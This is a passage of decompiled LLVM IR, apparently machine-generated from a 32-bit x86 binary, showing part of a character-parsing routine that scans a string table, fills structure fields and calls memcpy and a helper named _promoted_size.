  %v0_804eaae = phi i32 [ %v1_804e8fd, %dec_label_pc_804e8fd ], [ %v0_804ea8b.pre.pre, %dec_label_pc_804ea95 ]
  %v0_804eaab = phi i32 [ %v0_804ea95, %dec_label_pc_804e8fd ], [ %v1_804ea95, %dec_label_pc_804ea95 ]
  %v1_804ea9d = add i32 %v0_804eaab, -134548448
  %v1_804eaa2 = add i32 %v0_804eaab, -134548449
  %v5_804eaa2 = sub i32 134548448, %v0_804eaab
  %v6_804eaa2 = and i32 %v1_804ea9d, %v5_804eaa2
  %v7_804eaa2 = icmp slt i32 %v6_804eaa2, 0
  %v8_804eaa2 = icmp eq i32 %v1_804eaa2, 0
  %v9_804eaa2 = icmp slt i32 %v1_804eaa2, 0
  store i32 %v1_804eaa2, i32* %eax.global-to-local, align 4
  %v3_804eaa3 = icmp eq i1 %v9_804eaa2, %v7_804eaa2
  %v4_804eaa3 = icmp eq i1 %v8_804eaa2, false
  %v5_804eaa3 = and i1 %v4_804eaa3, %v3_804eaa3
  br i1 %v5_804eaa3, label %dec_label_pc_804eaaf, label %dec_label_pc_804eaa5

dec_label_pc_804eaa5:                             ; preds = %dec_label_pc_804ea9b
  %v1_804eaa5 = inttoptr i32 %v0_804eaae to i8*
  %v2_804eaa5 = load i8, i8* %v1_804eaa5, align 1
  %v3_804eaa5 = zext i8 %v2_804eaa5 to i32
  %v5_804eaa5 = and i32 %v1_804eaa2, -256
  %v6_804eaa5 = or i32 %v3_804eaa5, %v5_804eaa5
  store i32 %v6_804eaa5, i32* %eax.global-to-local, align 4
  %v3_804eaa7 = inttoptr i32 %v0_804eaab to i8*
  %v4_804eaa7 = load i8, i8* %v3_804eaa7, align 1
  %v15_804eaa7 = icmp eq i8 %v2_804eaa5, %v4_804eaa7
  %v1_804eaa9 = icmp eq i1 %v15_804eaa7, false
  br i1 %v1_804eaa9, label %dec_label_pc_804eaaf, label %dec_label_pc_804eaab

dec_label_pc_804eaab:                             ; preds = %dec_label_pc_804eaa5
  %v1_804eaab = add i32 %v0_804eaab, 9
  store i32 %v1_804eaab, i32* @edx, align 4
  %v1_804eaae = add i32 %v0_804eaae, 1
  store i32 %v1_804eaae, i32* @esi, align 4
  br label %dec_label_pc_804eaaf

dec_label_pc_804eaaf:                             ; preds = %dec_label_pc_804eaa5, %dec_label_pc_804ea9b, %dec_label_pc_804eaab
  %v4_804eab3 = phi i32 [ %v6_804eaa5, %dec_label_pc_804eaa5 ], [ %v1_804eaa2, %dec_label_pc_804ea9b ], [ %v6_804eaa5, %dec_label_pc_804eaab ]
  %v0_804eab3 = phi i32 [ %v0_804eaae, %dec_label_pc_804eaa5 ], [ %v0_804eaae, %dec_label_pc_804ea9b ], [ %v1_804eaae, %dec_label_pc_804eaab ]
  %v0_804eaaf = phi i32 [ %v0_804eaab, %dec_label_pc_804eaa5 ], [ %v0_804eaab, %dec_label_pc_804ea9b ], [ %v1_804eaab, %dec_label_pc_804eaab ]
  %v1_804eaaf = add i32 %v0_804eaaf, 9
  %v2_804eaaf = inttoptr i32 %v1_804eaaf to i8*
  %v3_804eaaf = load i8, i8* %v2_804eaaf, align 1
  %v4_804eaaf = sext i8 %v3_804eaaf to i32
  store i32 %v4_804eaaf, i32* %ebx.global-to-local, align 4
  %v1_804eab3 = inttoptr i32 %v0_804eab3 to i8*
  %v2_804eab3 = load i8, i8* %v1_804eab3, align 1
  %v3_804eab3 = zext i8 %v2_804eab3 to i32
  %v5_804eab3 = and i32 %v4_804eab3, -256
  %v6_804eab3 = or i32 %v3_804eab3, %v5_804eab3
  store i32 %v6_804eab3, i32* %eax.global-to-local, align 4
  %v2_804eab5 = mul nsw i32 %v4_804eaaf, 256
  store i32 %v2_804eab5, i32* %ebx.global-to-local, align 4
  %v4_804eab8 = icmp eq i8 %v2_804eab3, 0
  br i1 %v4_804eab8, label %dec_label_pc_804ec75, label %dec_label_pc_804eac0

dec_label_pc_804eac0:                             ; preds = %dec_label_pc_804eaaf
  %v3_804eac0 = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_804eac0, i32* %edx.global-to-local, align 4
  store i32 ptrtoint ([21 x i8]* @global_var_8050c1d.121 to i32), i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_804eac9

dec_label_pc_804eac9:                             ; preds = %dec_label_pc_804eb19, %dec_label_pc_804eac0
  %v0_804eb19 = phi i32 [ %v1_804eb19, %dec_label_pc_804eb19 ], [ ptrtoint ([21 x i8]* @global_var_8050c1d.121 to i32), %dec_label_pc_804eac0 ]
  %v3_804eac9 = inttoptr i32 %v0_804eb19 to i8*
  %v4_804eac9 = load i8, i8* %v3_804eac9, align 1
  %v15_804eac9 = icmp eq i8 %v2_804eab3, %v4_804eac9
  %v1_804eacb = icmp eq i1 %v15_804eac9, false
  br i1 %v1_804eacb, label %dec_label_pc_804eb19, label %dec_label_pc_804eacd

dec_label_pc_804eacd:                             ; preds = %dec_label_pc_804eac9
  %v1_804eacf = add i32 %v0_804eb19, -134548509
  store i32 %v1_804eacf, i32* %edx.global-to-local, align 4
  %v7_804ead8 = icmp sgt i32 %v1_804eacf, 17
  br i1 %v7_804ead8, label %dec_label_pc_804eada, label %dec_label_pc_804eae3

dec_label_pc_804eada:                             ; preds = %dec_label_pc_804eacd
  %v1_804eada = add i32 %v0_804eb19, -134548511
  store i32 %v1_804eada, i32* %eax.global-to-local, align 4
  %v3_804eadd = and i32 %v2_804eab5, 1024
  %v4_804eadd = icmp eq i32 %v3_804eadd, 0
  %v1_804eae0 = icmp eq i1 %v4_804eadd, false
  %v4_804eae0 = select i1 %v1_804eae0, i32 %v1_804eada, i32 %v1_804eacf
  store i32 %v4_804eae0, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804eae3

dec_label_pc_804eae3:                             ; preds = %dec_label_pc_804eacd, %dec_label_pc_804eada
  %v0_804eaec = phi i32 [ %v1_804eacf, %dec_label_pc_804eacd ], [ %v4_804eae0, %dec_label_pc_804eada ]
  store i32 %tmp76, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_8050c13.122 to i32), i32* %ecx.global-to-local, align 4
  %v2_804eaec = add i32 %tmp76, 32
  %v3_804eaec = inttoptr i32 %v2_804eaec to i32*
  store i32 %v0_804eaec, i32* %v3_804eaec, align 4
  %v0_804eaef.pre = load i32, i32* %ecx.global-to-local, align 4
  %v0_804eaf3.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804eaef

dec_label_pc_804eaef:                             ; preds = %dec_label_pc_804eaef, %dec_label_pc_804eae3
  %v0_804eaef = phi i32 [ %v1_804eaef, %dec_label_pc_804eaef ], [ %v0_804eaef.pre, %dec_label_pc_804eae3 ]
  %v1_804eaef = add i32 %v0_804eaef, 1
  store i32 %v1_804eaef, i32* %ecx.global-to-local, align 4
  %v1_804eaf0 = inttoptr i32 %v1_804eaef to i8*
  %v2_804eaf0 = load i8, i8* %v1_804eaf0, align 1
  %v3_804eaf0 = sext i8 %v2_804eaf0 to i32
  store i32 %v3_804eaf0, i32* %eax.global-to-local, align 4
  %v8_804eaf5 = icmp sgt i32 %v0_804eaf3.pre, %v3_804eaf0
  br i1 %v8_804eaf5, label %dec_label_pc_804eaef, label %dec_label_pc_804eaf7

dec_label_pc_804eaf7:                             ; preds = %dec_label_pc_804eaef
  store i32 ptrtoint ([21 x i8]* @global_var_8050c1d.121 to i32), i32* @ecx, align 4
  %v1_804eafe = add i32 %v0_804eaef, -134548499
  store i32 %v1_804eafe, i32* %eax.global-to-local, align 4
  %v2_804eb03 = add i32 %v0_804eaef, add (i32 ptrtoint (i32* @global_var_8050c04.123 to i32), i32 -134548499)
  %v3_804eb03 = add i32 %v2_804eb03, %v1_804eafe
  %v4_804eb03 = inttoptr i32 %v3_804eb03 to i16*
  %v5_804eb03 = load i16, i16* %v4_804eb03, align 2
  %v6_804eb03 = sext i16 %v5_804eb03 to i32
  store i32 %v6_804eb03, i32* %edx.global-to-local, align 4
  %factor = mul i32 %v1_804eafe, 2
  %v3_804eb0b = add i32 %factor, 134548468
  %v4_804eb0b = inttoptr i32 %v3_804eb0b to i16*
  %v5_804eb0b = load i16, i16* %v4_804eb0b, align 2
  %v6_804eb0b = sext i16 %v5_804eb0b to i32
  store i32 %v6_804eb0b, i32* %eax.global-to-local, align 4
  %v1_804eb13 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804eb13 = or i32 %v1_804eb13, %v6_804eb03
  %v2_804eb15 = and i32 %v2_804eb13, %v6_804eb0b
  store i32 %v2_804eb15, i32* %edx.global-to-local, align 4
  %v0_804eb27.pre = load i32, i32* @esi, align 4
  %v0_804eb2a.pre = load i32, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_804eb1f

dec_label_pc_804eb19:                             ; preds = %dec_label_pc_804eac9
  %v1_804eb19 = add i32 %v0_804eb19, 1
  store i32 %v1_804eb19, i32* @ecx, align 4
  %v1_804eb1a = inttoptr i32 %v1_804eb19 to i8*
  %v2_804eb1a = load i8, i8* %v1_804eb1a, align 1
  %v3_804eb1a = icmp eq i8 %v2_804eb1a, 0
  %v1_804eb1d = icmp eq i1 %v3_804eb1a, false
  br i1 %v1_804eb1d, label %dec_label_pc_804eac9, label %dec_label_pc_804eb1f

dec_label_pc_804eb1f:                             ; preds = %dec_label_pc_804eb19, %dec_label_pc_804eaf7
  %v0_804eb2a = phi i32 [ %v0_804eb2a.pre, %dec_label_pc_804eaf7 ], [ %storemerge4, %dec_label_pc_804eb19 ]
  %v0_804eb27 = phi i32 [ %v0_804eb27.pre, %dec_label_pc_804eaf7 ], [ %v0_804eab3, %dec_label_pc_804eb19 ]
  %v0_804eb1f = phi i32 [ %v2_804eb15, %dec_label_pc_804eaf7 ], [ %v3_804eac0, %dec_label_pc_804eb19 ]
  store i32 %v0_804eb1f, i32* %stack_var_-20, align 4
  store i32 %tmp76, i32* @edx, align 4
  %v1_804eb27 = inttoptr i32 %v0_804eb27 to i8*
  %v2_804eb27 = load i8, i8* %v1_804eb27, align 1
  %v3_804eb27 = sext i8 %v2_804eb27 to i32
  store i32 %v3_804eb27, i32* %eax.global-to-local, align 4
  %v2_804eb2a = add i32 %tmp76, 4
  %v3_804eb2a = inttoptr i32 %v2_804eb2a to i32*
  store i32 %v0_804eb2a, i32* %v3_804eb2a, align 4
  %v0_804eb2d = load i32, i32* %eax.global-to-local, align 4
  %v1_804eb2d = load i32, i32* @edx, align 4
  %v2_804eb2d = add i32 %v1_804eb2d, 12
  %v3_804eb2d = inttoptr i32 %v2_804eb2d to i32*
  store i32 %v0_804eb2d, i32* %v3_804eb2d, align 4
  store i32 %stack_var_-96.2, i32* %eax.global-to-local, align 4
  %v0_804eb34 = load i32, i32* @edx, align 4
  %v1_804eb34 = add i32 %v0_804eb34, 28
  %v2_804eb34 = inttoptr i32 %v1_804eb34 to i32*
  store i32 1, i32* %v2_804eb34, align 4
  %v0_804eb3b = load i32, i32* %eax.global-to-local, align 4
  %v1_804eb3b = load i32, i32* @edx, align 4
  %v2_804eb3b = add i32 %v1_804eb3b, 8
  %v3_804eb3b = inttoptr i32 %v2_804eb3b to i32*
  store i32 %v0_804eb3b, i32* %v3_804eb3b, align 4
  %v0_804eb3e = load i32, i32* %edi.global-to-local, align 4
  %v1_804eb48 = and i32 %v0_804eb3e, -5
  %v0_804eb4e = load i32, i32* %ebx.global-to-local, align 4
  %v1_804eb4e = and i32 %v0_804eb4e, 3840
  store i32 %v1_804eb4e, i32* %ebx.global-to-local, align 4
  store i32 48, i32* %eax.global-to-local, align 4
  %v2_804eb57 = or i32 %v1_804eb4e, %v1_804eb48
  store i32 %v2_804eb57, i32* @edi, align 4
  %v1_804eb59 = load i32, i32* @edx, align 4
  %v2_804eb59 = add i32 %v1_804eb59, 20
  %v3_804eb59 = inttoptr i32 %v2_804eb59 to i32*
  store i32 48, i32* %v3_804eb59, align 4
  %v0_804eb5c = load i32, i32* @edi, align 4
  %v1_804eb5c = load i32, i32* @edx, align 4
  %v2_804eb5c = add i32 %v1_804eb5c, 16
  %v3_804eb5c = inttoptr i32 %v2_804eb5c to i32*
  store i32 %v0_804eb5c, i32* %v3_804eb5c, align 4
  %v0_804eb5f = load i32, i32* @ecx, align 4
  %v1_804eb5f = inttoptr i32 %v0_804eb5f to i8*
  %v2_804eb5f = load i8, i8* %v1_804eb5f, align 1
  %v3_804eb5f = icmp eq i8 %v2_804eb5f, 0
  %v1_804eb62 = icmp eq i1 %v3_804eb5f, false
  br i1 %v1_804eb62, label %dec_label_pc_804eb7b, label %dec_label_pc_804eb64

dec_label_pc_804eb64:                             ; preds = %dec_label_pc_804eb1f
  %v0_804eb64 = load i32, i32* @esi, align 4
  %v1_804eb64 = inttoptr i32 %v0_804eb64 to i8*
  %v2_804eb64 = load i8, i8* %v1_804eb64, align 1
  %v11_804eb64 = icmp eq i8 %v2_804eb64, 109
  %v1_804eb67 = icmp eq i1 %v11_804eb64, false
  br i1 %v1_804eb67, label %dec_label_pc_804ec75, label %dec_label_pc_804eb6d

dec_label_pc_804eb6d:                             ; preds = %dec_label_pc_804eb64
  %v0_804eb6d = load i32, i32* @edx, align 4
  %v1_804eb6d = add i32 %v0_804eb6d, 32
  %v2_804eb6d = inttoptr i32 %v1_804eb6d to i32*
  store i32 20, i32* %v2_804eb6d, align 4
  %v0_804eb74 = load i32, i32* @edx, align 4
  %v1_804eb74 = add i32 %v0_804eb74, 28
  %v2_804eb74 = inttoptr i32 %v1_804eb74 to i32*
  store i32 0, i32* %v2_804eb74, align 4
  br label %dec_label_pc_804eb7b

dec_label_pc_804eb7b:                             ; preds = %dec_label_pc_804eb1f, %dec_label_pc_804eb6d
  %tmp92 = icmp slt i32 %stack_var_-88.3, 1
  br i1 %tmp92, label %dec_label_pc_804ec17, label %dec_label_pc_804eb86

dec_label_pc_804eb86:                             ; preds = %dec_label_pc_804eb7b
  store i32 0, i32* %ebp.global-to-local, align 4
  %v4_804ebff = add i32 %tmp76, 40
  %v4_804eb95 = add i32 %tmp76, 36
  %v1_804ec08 = add i32 %tmp76, 28
  %v2_804ec08 = inttoptr i32 %v1_804ec08 to i32*
  br label %dec_label_pc_804eb88

dec_label_pc_804eb88:                             ; preds = %dec_label_pc_804ec03, %dec_label_pc_804eb86
  %v0_804eb9e = phi i32 [ 0, %dec_label_pc_804eb86 ], [ %v1_804ec07, %dec_label_pc_804ec03 ]
  %stack_var_-88.4 = phi i32 [ %stack_var_-88.3, %dec_label_pc_804eb86 ], [ %stack_var_-88.5, %dec_label_pc_804ec03 ]
  %v1_804eb88 = add i32 %v0_804eb9e, -2
  %v6_804eb88 = sub i32 1, %v0_804eb9e
  %v7_804eb88 = and i32 %v6_804eb88, %v0_804eb9e
  %v8_804eb88 = icmp slt i32 %v7_804eb88, 0
  %v9_804eb88 = icmp eq i32 %v1_804eb88, 0
  %v10_804eb88 = icmp slt i32 %v1_804eb88, 0
  %v3_804eb8b = icmp eq i1 %v10_804eb88, %v8_804eb88
  %v4_804eb8b = icmp eq i1 %v9_804eb88, false
  %v5_804eb8b = and i1 %v4_804eb8b, %v3_804eb8b
  br i1 %v5_804eb8b, label %dec_label_pc_804eb9e, label %dec_label_pc_804eb8d

dec_label_pc_804eb8d:                             ; preds = %dec_label_pc_804eb88
  %v0_804eb8d = load i32, i32* @esp, align 4
  %v2_804eb8d = mul i32 %v0_804eb9e, 4
  %v3_804eb8d = add i32 %v2_804eb8d, 68
  %v4_804eb8d = add i32 %v3_804eb8d, %v0_804eb8d
  %v5_804eb8d = inttoptr i32 %v4_804eb8d to i32*
  %v6_804eb8d = load i32, i32* %v5_804eb8d, align 4
  store i32 %v6_804eb8d, i32* %eax.global-to-local, align 4
  store i32 %tmp76, i32* @edx, align 4
  %v1_804eb95 = trunc i32 %v6_804eb8d to i8
  %v5_804eb95 = add i32 %v4_804eb95, %v0_804eb9e
  %v6_804eb95 = inttoptr i32 %v5_804eb95 to i8*
  store i8 %v1_804eb95, i8* %v6_804eb95, align 1
  %v0_804eb99 = load i32, i32* %eax.global-to-local, align 4
  %v1_804eb99 = urem i32 %v0_804eb99, 256
  br label %dec_label_pc_804eba7

dec_label_pc_804eb9e:                             ; preds = %dec_label_pc_804eb88
  %v5_804eba0 = add i32 %v0_804eb9e, %stack_var_-32.3
  store i32 %v5_804eba0, i32* %eax.global-to-local, align 4
  %v1_804eba4 = add i32 %v5_804eba0, -2
  br label %dec_label_pc_804eba7

dec_label_pc_804eba7:                             ; preds = %dec_label_pc_804eb8d, %dec_label_pc_804eb9e
  %v0_804ebba = phi i32 [ %v1_804eb99, %dec_label_pc_804eb8d ], [ %v1_804eba4, %dec_label_pc_804eb9e ]
  store i32 %v0_804ebba, i32* %eax.global-to-local, align 4
  %v5_804eba7 = sub i32 %v0_804ebba, %stack_var_-88.4
  %v11_804eba7 = xor i32 %v0_804ebba, %stack_var_-88.4
  %v12_804eba7 = xor i32 %v5_804eba7, %v0_804ebba
  %v13_804eba7 = and i32 %v12_804eba7, %v11_804eba7
  %v14_804eba7 = icmp slt i32 %v13_804eba7, 0
  %v15_804eba7 = icmp eq i32 %v5_804eba7, 0
  %v16_804eba7 = icmp slt i32 %v5_804eba7, 0
  %v3_804ebab = icmp ne i1 %v16_804eba7, %v14_804eba7
  %v4_804ebab = or i1 %v15_804eba7, %v3_804ebab
  br i1 %v4_804ebab, label %dec_label_pc_804ebba, label %dec_label_pc_804ebad

dec_label_pc_804ebad:                             ; preds = %dec_label_pc_804eba7
  %v1_804ebad = add i32 %v0_804ebba, -9
  %v6_804ebad = sub i32 8, %v0_804ebba
  %v7_804ebad = and i32 %v6_804ebad, %v0_804ebba
  %v8_804ebad = icmp slt i32 %v7_804ebad, 0
  %v9_804ebad = icmp eq i32 %v1_804ebad, 0
  %v10_804ebad = icmp slt i32 %v1_804ebad, 0
  %v3_804ebb0 = icmp eq i1 %v10_804ebad, %v8_804ebad
  %v4_804ebb0 = icmp eq i1 %v9_804ebad, false
  %v5_804ebb0 = and i1 %v4_804ebb0, %v3_804ebb0
  br i1 %v5_804ebb0, label %dec_label_pc_804ec75, label %dec_label_pc_804ebba

dec_label_pc_804ebba:                             ; preds = %dec_label_pc_804ebad, %dec_label_pc_804eba7
  %stack_var_-88.5 = phi i32 [ %stack_var_-88.4, %dec_label_pc_804eba7 ], [ %v0_804ebba, %dec_label_pc_804ebad ]
  %v1_804ebba = add i32 %v0_804ebba, -1
  store i32 %v1_804ebba, i32* %eax.global-to-local, align 4
  store i32 %tmp76, i32* @edx, align 4
  %v0_804ebc3 = load i32, i32* @esp, align 4
  %v1_804ebc3 = load i32, i32* %ebp.global-to-local, align 4
  %v2_804ebc3 = mul i32 %v1_804ebc3, 4
  %v3_804ebc3 = add i32 %v0_804ebc3, 80
  %v4_804ebc3 = add i32 %v3_804ebc3, %v2_804ebc3
  %v5_804ebc3 = inttoptr i32 %v4_804ebc3 to i32*
  %v6_804ebc3 = load i32, i32* %v5_804ebc3, align 4
  store i32 %v6_804ebc3, i32* %edi.global-to-local, align 4
  %v2_804ebc7 = mul i32 %v1_804ebba, 4
  %v4_804ebc7 = add i32 %v4_804ebff, %v2_804ebc7
  %v5_804ebc7 = inttoptr i32 %v4_804ebc7 to i32*
  %v6_804ebc7 = load i32, i32* %v5_804ebc7, align 4
  store i32 %v6_804ebc7, i32* @eax, align 4
  %v9_804ebcb = icmp eq i32 %v6_804ebc3, 8
  br i1 %v9_804ebcb, label %dec_label_pc_804ec03, label %dec_label_pc_804ebd0

dec_label_pc_804ebd0:                             ; preds = %dec_label_pc_804ebba
  %v9_804ebd0 = icmp eq i32 %v6_804ebc7, 8
  br i1 %v9_804ebd0, label %dec_label_pc_804ebf3, label %dec_label_pc_804ebd5

dec_label_pc_804ebd5:                             ; preds = %dec_label_pc_804ebd0
  %v12_804ebd5 = icmp eq i32 %v6_804ebc7, %v6_804ebc3
  br i1 %v12_804ebd5, label %dec_label_pc_804ebf3, label %dec_label_pc_804ebd9

dec_label_pc_804ebd9:                             ; preds = %dec_label_pc_804ebd5
  %v1_804ebd9 = call i32 @_promoted_size(i32 %v1_804ebba)
  store i32 %v1_804ebd9, i32* %ebx.global-to-local, align 4
  %v0_804ebe0 = load i32, i32* %edi.global-to-local, align 4
  store i32 %v0_804ebe0, i32* @eax, align 4
  %v1_804ebe2 = call i32 @_promoted_size(i32 %v1_804ebba)
  %v2_804ebe7 = sub i32 %v1_804ebd9, %v1_804ebe2
  %v8_804ebe7 = xor i32 %v1_804ebd9, %v1_804ebe2
  %v9_804ebe7 = xor i32 %v2_804ebe7, %v1_804ebd9
  %v10_804ebe7 = and i32 %v9_804ebe7, %v8_804ebe7
  %v11_804ebe7 = icmp slt i32 %v10_804ebe7, 0
  %v12_804ebe7 = icmp eq i32 %v2_804ebe7, 0
  %v13_804ebe7 = icmp slt i32 %v2_804ebe7, 0
  %v3_804ebe9 = icmp ne i1 %v13_804ebe7, %v11_804ebe7
  %v4_804ebe9 = or i1 %v12_804ebe7, %v3_804ebe9
  %v5_804ebe9 = zext i1 %v4_804ebe9 to i32
  store i32 %v5_804ebe9, i32* %eax.global-to-local, align 4
  %v1_804ebef = icmp eq i1 %v4_804ebe9, false
  br i1 %v1_804ebef, label %dec_label_pc_804ec03, label %dec_label_pc_804ebd9.dec_label_pc_804ebf3_crit_edge

dec_label_pc_804ebd9.dec_label_pc_804ebf3_crit_edge: ; preds = %dec_label_pc_804ebd9
  %v0_804ebf3.pre = load i32, i32* @esp, align 4
  %v1_804ebf3.pre = load i32, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_804ebf3

dec_label_pc_804ebf3:                             ; preds = %dec_label_pc_804ebd9.dec_label_pc_804ebf3_crit_edge, %dec_label_pc_804ebd5, %dec_label_pc_804ebd0
  %v1_804ebf3 = phi i32 [ %v1_804ebf3.pre, %dec_label_pc_804ebd9.dec_label_pc_804ebf3_crit_edge ], [ %v1_804ebc3, %dec_label_pc_804ebd5 ], [ %v1_804ebc3, %dec_label_pc_804ebd0 ]
  %v0_804ebf3 = phi i32 [ %v0_804ebf3.pre, %dec_label_pc_804ebd9.dec_label_pc_804ebf3_crit_edge ], [ %v0_804ebc3, %dec_label_pc_804ebd5 ], [ %v0_804ebc3, %dec_label_pc_804ebd0 ]
  %v2_804ebf3 = mul i32 %v1_804ebf3, 4
  %v3_804ebf3 = add i32 %v0_804ebf3, 80
  %v4_804ebf3 = add i32 %v3_804ebf3, %v2_804ebf3
  %v5_804ebf3 = inttoptr i32 %v4_804ebf3 to i32*
  %v6_804ebf3 = load i32, i32* %v5_804ebf3, align 4
  store i32 %v6_804ebf3, i32* %eax.global-to-local, align 4
  store i32 %v1_804ebba, i32* %ecx.global-to-local, align 4
  store i32 %tmp76, i32* @edx, align 4
  store i32 %v6_804ebf3, i32* %v5_804ebc7, align 4
  br label %dec_label_pc_804ec03

dec_label_pc_804ec03:                             ; preds = %dec_label_pc_804ebd9, %dec_label_pc_804ebba, %dec_label_pc_804ebf3
  store i32 %tmp76, i32* @ecx, align 4
  %v0_804ec07 = load i32, i32* %ebp.global-to-local, align 4
  %v1_804ec07 = add i32 %v0_804ec07, 1
  store i32 %v1_804ec07, i32* %ebp.global-to-local, align 4
  %v3_804ec08 = load i32, i32* %v2_804ec08, align 4
  %v1_804ec0b = add i32 %v3_804ec08, 2
  store i32 %v1_804ec0b, i32* %eax.global-to-local, align 4
  %v5_804ec10 = icmp slt i32 %v1_804ec07, %v1_804ec0b
  br i1 %v5_804ec10, label %dec_label_pc_804eb88, label %dec_label_pc_804ec3e

dec_label_pc_804ec17:                             ; preds = %dec_label_pc_804eb7b
  store i32 %tmp76, i32* %eax.global-to-local, align 4
  %v1_804ec1b = add i32 %tmp76, 38
  %v2_804ec1b = inttoptr i32 %v1_804ec1b to i8*
  store i8 1, i8* %v2_804ec1b, align 1
  store i32 %tmp76, i32* %edx.global-to-local, align 4
  %v1_804ec24 = add i32 %tmp76, 28
  %v2_804ec24 = inttoptr i32 %v1_804ec24 to i32*
  %v3_804ec24 = load i32, i32* %v2_804ec24, align 4
  %v2_804ec27 = mul i32 %v3_804ec24, 4
  %v2_804ec2b = ptrtoint i32* %stack_var_-20 to i32
  %v1_804ec32 = add i32 %tmp76, 40
  store i32 %v1_804ec32, i32* %eax.global-to-local, align 4
  %v3_804ec36 = inttoptr i32 %v1_804ec32 to i16*
  %v4_804ec36 = call i32 @memcpy(i16* %v3_804ec36, i32 %v2_804ec2b, i32 %v2_804ec27)
  store i32 %v4_804ec36, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804ec3e

dec_label_pc_804ec3e:                             ; preds = %dec_label_pc_804ec03, %dec_label_pc_804ec17
  %stack_var_-88.6 = phi i32 [ %stack_var_-88.3, %dec_label_pc_804ec17 ], [ %stack_var_-88.5, %dec_label_pc_804ec03 ]
  store i32 %tmp76, i32* @ecx, align 4
  store i32 %stack_var_-88.6, i32* %eax.global-to-local, align 4
  %v2_804ec46 = inttoptr i32 %v1_804e8e7 to i8*
  %v3_804ec46 = load i8, i8* %v2_804ec46, align 1
  %v5_804ec46 = icmp slt i8 %v3_804ec46, 0
  store i32 %stack_var_-88.6, i32* %v2_804e8e0, align 4
  br i1 %v5_804ec46, label %dec_label_pc_804ec56, label %dec_label_pc_804ec4f

dec_label_pc_804ec4f:                             ; preds = %dec_label_pc_804ec3e
  %v0_804ec4f = load i32, i32* @esi, align 4
  %v1_804ec4f = add i32 %v0_804ec4f, 1
  store i32 %v1_804ec4f, i32* %eax.global-to-local, align 4
  %v1_804ec52 = load i32, i32* @ecx, align 4
  %v2_804ec52 = inttoptr i32 %v1_804ec52 to i32*
  store i32 %v1_804ec4f, i32* %v2_804ec52, align 4
  br label %dec_label_pc_804ec69

dec_label_pc_804ec56:                             ; preds = %dec_label_pc_804ec3e
  store i32 %tmp76, i32* @ecx, align 4
  store i32 %v4_804e8b4, i32* %edx.global-to-local, align 4
  %v0_804ec5e = load i32, i32* @esi, align 4
  %v2_804ec5e = sub i32 %v0_804ec5e, %v4_804e8b4
  store i32 %v2_804ec5e, i32* %esi.global-to-local, align 4
  %v1_804ec60 = mul i32 %v2_804ec5e, 4
  %v2_804ec60 = add i32 %v1_804ec60, 224
  store i32 %v2_804ec60, i32* %eax.global-to-local, align 4
  %v2_804ec67 = load i32, i32* %arg1, align 4
  %v4_804ec67 = add i32 %v2_804ec67, %v2_804ec60
  store i32 %v4_804ec67, i32* %arg1, align 4
  br label %dec_label_pc_804ec69

dec_label_pc_804ec69:                             ; preds = %dec_label_pc_804ec4f, %dec_label_pc_804ec56
  store i32 %tmp76, i32* @edx, align 4
  %v1_804ec6d = add i32 %tmp76, 28
  %v2_804ec6d = inttoptr i32 %v1_804ec6d to i32*
  %v3_804ec6d = load i32, i32* %v2_804ec6d, align 4
  store i32 %v3_804ec6d, i32* %eax.global-to-local, align 4
  %v1_804ec70 = add i32 %v3_804ec6d, 2
  br label %dec_label_pc_804ec78

dec_label_pc_804ec75:                             ; preds = %dec_label_pc_804e905, %dec_label_pc_804e99f, %dec_label_pc_804e9d2, %dec_label_pc_804ea4d, %dec_label_pc_804ea39, %dec_label_pc_804ea30, %dec_label_pc_804ebad, %dec_label_pc_804eb64, %dec_label_pc_804eaaf
  br label %dec_label_pc_804ec78

dec_label_pc_804ec78:                             ; preds = %dec_label_pc_804ec69, %dec_label_pc_804ec75
  %storemerge6 = phi i32 [ %v1_804ec70, %dec_label_pc_804ec69 ], [ -1, %dec_label_pc_804ec75 ]
  store i32 %storemerge6, i32* %eax.global-to-local, align 4
  %v2_804ec7b = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_804ec7b, i32* @ebx, align 4
  store i32 %v0_804e8b3, i32* @esi, align 4
  store i32 %v0_804e8b2, i32* @edi, align 4
  ret i32 %storemerge6

; uselistorder directives
  uselistorder i32 %v1_804ec07, { 0, 2, 1 }
  uselistorder i32 %v2_804ebe7, { 1, 2, 0 }
  uselistorder i32 %v1_804ebd9, { 2, 1, 0, 3 }
  uselistorder i32 %v1_804ebba, { 3, 2, 1, 0, 4 }
  uselistorder i32 %v1_804ebad, { 1, 0 }
  uselistorder i32 %v5_804eba7, { 1, 2, 0 }
  uselistorder i32 %v0_804ebba, { 4, 3, 0, 6, 5, 1, 2, 7, 8 }
  uselistorder i32 %v1_804eb88, { 1, 0 }
  uselistorder i32 %stack_var_-88.4, { 1, 0, 2 }
  uselistorder i32 %v0_804eb9e, { 0, 2, 3, 1, 5, 4 }
  uselistorder i32 %v1_804eb19, { 1, 2, 0 }
  uselistorder i32 %v1_804eaef, { 1, 2, 0 }
  uselistorder i32 %v0_804eb19, { 2, 0, 1, 3 }
  uselistorder i32 %v2_804eab5, { 1, 0 }
  uselistorder i32 %v1_804eaa2, { 0, 1, 4, 3, 2 }
  uselistorder i32 %v0_804eaab, { 0, 1, 2, 3, 6, 5, 4 }
  uselistorder i32 %v1_804ea95, { 0, 2, 3, 1 }
  uselistorder i32 %v6_804ea8b, { 1, 0 }
  uselistorder i32 %v1_804ea6d, { 1, 0 }
  uselistorder i32 %v0_804ea8b.pre.pre, { 0, 3, 1, 2 }
  uselistorder i32 %stack_var_-88.3, { 3, 2, 1, 4, 0 }
  uselistorder i32 %stack_var_-32.3, { 1, 0 }
  uselistorder i32 %v1_804ea50, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v0_804ea47, { 1, 2, 0 }
  uselistorder i32 %v0_804ea0d, { 1, 0 }
  uselistorder i32 %v1_804e9ff, { 1, 0 }
  uselistorder i32 %v1_804e9fa, { 0, 1, 3, 2 }
  uselistorder i32 %v6_804e9f8, { 2, 0, 1 }
  uselistorder i32 %v0_804ea1a, { 0, 2, 4, 3, 1 }
